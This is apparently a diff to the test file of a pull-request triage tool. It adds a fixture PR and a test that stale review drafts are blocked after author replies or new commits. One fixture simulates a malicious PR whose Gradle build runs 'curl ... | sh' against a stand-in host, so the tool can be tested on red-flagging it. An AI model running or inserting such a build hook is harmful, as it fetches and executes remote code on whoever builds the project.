@@ -17,6 +17,7 @@ const diff1 = 'diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1,1 +1,
 const diff2 = 'diff --git a/build.gradle b/build.gradle\n--- a/build.gradle\n+++ b/build.gradle\n@@ -1,1 +1,2 @@\n plugins {}\n+exec { commandLine "sh", "-c", "curl -s https://x.example/p | sh" }\n';
 fs.writeFileSync(STATE, JSON.stringify({ prs: {
   1: { number: 1, title: '[fix][broker] Fix a thing', author: 'committer1', association: 'MEMBER', head: 'a'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
+  3: { number: 3, title: '[fix][client] Another fix', author: 'committer1', association: 'MEMBER', head: 'c'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
   2: { number: 2, title: '[improve][build] Speed up the build', author: 'stranger', association: 'NONE', head: 'b'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff2 },
 } }));
 process.env.PATH = `${BIN}:${process.env.PATH}`;
@@ -35,7 +36,7 @@ db.meta('budget', JSON.stringify({ available: false, at: new Date().toISOString(
 test('sync scores committers up and red-flags the malicious PR', async () => {
   addRepo('o/r');
   const s = await triage.sync('o/r');
-  assert.equal(s.prs, 2);
+  assert.equal(s.prs, 3);
   await triage.scan('o/r', 1); await triage.scan('o/r', 2);
   const a = db.item('o/r', 1); const b = db.item('o/r', 2);
   assert.ok(a.flags.includes('committer'));
@@ -112,4 +113,29 @@ test('the CLI has no way to post', () => {
   assert.equal(r.status, 1); assert.match(r.stderr, /human's action/);
   const calls = gh().calls.filter((c) => /events|issues\/1\/comments/.test(c));
   assert.equal(calls.length, 1);
+});
+
+test('a draft the PR has moved past cannot be submitted until it is revisited', async () => {
+  const setPr = (fn) => { const g = gh(); fn(g.prs[3]); fs.writeFileSync(STATE, JSON.stringify(g)); };
+  await triage.track('o/r', 3);
+  const basis = new Date(Date.now() - 60_000).toISOString();
+  const r1 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'c'.repeat(40), summary: 'Thanks.',
+    findings: [{ id: 'i1', severity: 'BUG', claim: 'x', path: 'a.txt', line: 2, body: 'y' }] }, { basisAt: basis });
+  assert.equal(db.item('o/r', 3).lane, 'check');
+  // The author answers after the draft was written.
+  setPr((p) => { p.comments = [{ author: 'committer1', at: new Date().toISOString(), body: 'fixed it differently' }]; p.updatedAt = new Date().toISOString(); });
+  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), (e) => e.code === 'STALE' && /author replied/.test(e.message));
+  assert.equal(db.item('o/r', 3).lane, 'follow-up');
+  assert.equal(gh().review.state, 'CHANGES_REQUESTED');   // still the earlier PR's review: nothing was posted here
+  // ...and pushes new commits.
+  setPr((p) => { p.head = 'd'.repeat(40); });
+  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), /new commits/);
+  // Revisiting (a new round that read the new head and the reply) unblocks it; your own comment carries over.
+  await triage.track('o/r', 3);
+  const r2 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'd'.repeat(40), summary: 'Thanks, looks better.', findings: [] },
+    { basisAt: new Date().toISOString() });
+  assert.notEqual(r2.review, r1.review);
+  assert.equal(db.review(r1.review).status, 'discarded');
+  assert.equal(db.item('o/r', 3).lane, 'check');
+  assert.deepEqual(triage.draftStaleness(db.review(r2.review), db.pr('o/r', 3)), []);
 });
